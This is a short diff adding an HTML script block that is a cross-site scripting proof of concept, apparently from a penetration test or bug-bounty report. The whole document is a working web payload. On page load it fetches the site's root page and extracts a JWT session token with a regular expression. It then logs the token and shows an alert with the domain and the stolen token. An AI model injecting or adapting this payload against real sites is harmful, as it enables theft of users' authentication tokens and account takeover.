@@ -1,0 +1,11 @@
+<script>
+  (async() => {
+let resp = await fetch(`/`);
+let text = await resp.text();
+
+let jwtToken = text.match(/eyJ[\w.]+/g)[0]
+console.log(jwtToken)
+
+alert(`XSS on ${document.domain}\nEXTRACTED JWT TOKEN: ${jwtToken}`)
+})();
+</script>
